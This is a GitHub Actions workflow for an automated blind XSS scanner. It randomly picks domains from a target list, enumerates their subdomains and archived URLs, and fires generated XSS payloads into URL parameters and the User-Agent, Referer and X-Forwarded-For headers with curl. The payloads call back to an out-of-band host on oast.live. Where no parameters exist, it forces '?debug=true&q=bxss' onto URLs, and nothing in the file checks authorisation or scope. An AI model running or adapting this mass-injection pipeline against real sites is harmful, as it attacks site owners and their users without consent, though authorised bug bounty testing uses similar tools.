name: "Blind XSS Hunter - Full Recon"

on:
  workflow_dispatch:
    inputs:
      target_count:
        description: 'Number of targets to scan'
        required: false
        default: '2'
      use_ai_triage:
        description: 'Use AI to prioritize targets'
        required: false
        default: true
        type: boolean

jobs:
  bxss-scan:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAIL_CHECK: ${{ secrets.EMAIL_USERNAME }}
      DISCORD_CHECK: ${{ secrets.DISCORD_WEBHOOK }}
      GEMINI_CHECK: ${{ secrets.GEMINI_API_KEY }}

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Toolset
        run: |
          go install github.com/tomnomnom/waybackurls@latest
          go install github.com/tomnomnom/qsreplace@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          pip install --quiet uro google-generativeai
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
          mkdir -p tmp results reports

      - name: URL Discovery Phase
        shell: bash
        env:
          TARGET_COUNT: ${{ github.event.inputs.target_count || '2' }}
        run: |
          set -euo pipefail
          touch tmp/subs.txt tmp/raw_urls.txt tmp/filtered.txt tmp/final_targets.txt
          
          # 1. Randomly select targets from your targets.txt
          grep -v "^#" targets.txt | grep -v "^$" | shuf -n "$TARGET_COUNT" > tmp/active_targets.txt
          
          while IFS= read -r domain; do
            domain=$(echo "$domain" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
            echo "üéØ Target: $domain"
            subfinder -d "$domain" -silent >> tmp/subs.txt || echo "$domain" >> tmp/subs.txt
            
            # Use Apex + Top 2 subdomains
            (echo "$domain"; head -n 2 tmp/subs.txt) | sort -u | while read -r sub; do
               echo "  ‚àü Discovery: $sub"
               (timeout 40s waybackurls "$sub" 2>/dev/null || true) >> tmp/raw_urls.txt
               (timeout 40s gau "$sub" --threads 5 --blacklist jpg,png,gif,css --subs 2>/dev/null || true) >> tmp/raw_urls.txt
               (timeout 60s katana -u "$sub" -silent -nc -jc -kf all -d 2 || true) >> tmp/raw_urls.txt
            done
          done < tmp/active_targets.txt
          
          # FALLBACK 1: If crawl found absolutely nothing, use the domain itself
          if [[ ! -s tmp/raw_urls.txt ]]; then
            cat tmp/active_targets.txt | sed 's|^|https://|' > tmp/raw_urls.txt
          fi

      - name: Parameter Mining & Fallback
        run: |
          # 2. Extract real parameters
          cat tmp/raw_urls.txt | uro | grep "=" > tmp/filtered.txt || true
          
          # FALLBACK 2: If no params found, force injection hooks on unique paths
          if [[ ! -s tmp/filtered.txt ]]; then
             echo "‚ö†Ô∏è No params found. Forcing debug hooks..."
             cat tmp/raw_urls.txt | sort -u | head -n 50 | sed 's/$/?debug=true\&q=bxss/' > tmp/filtered.txt
          fi
          echo "URL_FILTERED=$(wc -l < tmp/filtered.txt)" >> $GITHUB_ENV

      - name: Live Verification (Resilient)
        run: |
          # 3. Try to verify live hosts, but don't delete on failure
          cat tmp/filtered.txt | httpx -silent -timeout 10 -threads 20 -follow-redirects -no-color > tmp/verified_temp.txt || true
          
          if [[ -s tmp/verified_temp.txt ]]; then
            mv tmp/verified_temp.txt tmp/final_targets.txt
          else
            echo "‚ö†Ô∏è Verification failed. Using unverified list."
            cp tmp/filtered.txt tmp/final_targets.txt
          fi
          echo "URLS_SELECTED=$(wc -l < tmp/final_targets.txt)" >> $GITHUB_ENV

      - name: Execution Phase (URL + Header Injection)
        shell: bash
        env:
          OAST_URL: ${{ secrets.OAST_URL || 'd51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live' }}
        run: |
          # 4. Generate payloads
          python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt || echo "alert(1)" > tmp/payloads.txt
          
          mapfile -t PAYLOADS < tmp/payloads.txt
          success_count=0
          
          for i in "${!PAYLOADS[@]}"; do
            payload="${PAYLOADS[$i]}"
            echo "üíâ Variant $((i+1)) -> $(wc -l < tmp/final_targets.txt) targets"
            
            # Triple-Header Injection + URL Parameter Injection
            count=$(cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 10 \
              curl -sk -L -m 10 -w "%{http_code}\n" -o /dev/null \
              -H "User-Agent: $payload" \
              -H "Referer: $payload" \
              -H "X-Forwarded-For: $payload" \
              "{}" | grep -cE "^(200|302|403|404)" || echo 0)
            
            success_count=$((success_count + count))
          done
          echo "INJECTIONS_SUCCESS=$success_count" >> $GITHUB_ENV

      - name: Reporting
        if: always()
        run: |
          cat > reports/summary.md << EOF
          # üéØ Scan Summary
          - **Injections Sent:** $INJECTIONS_SUCCESS
          - **Unique URLs:** $URLS_SELECTED
          - **OAST Host:** \`${{ secrets.OAST_URL || 'oast.live' }}\`
          EOF
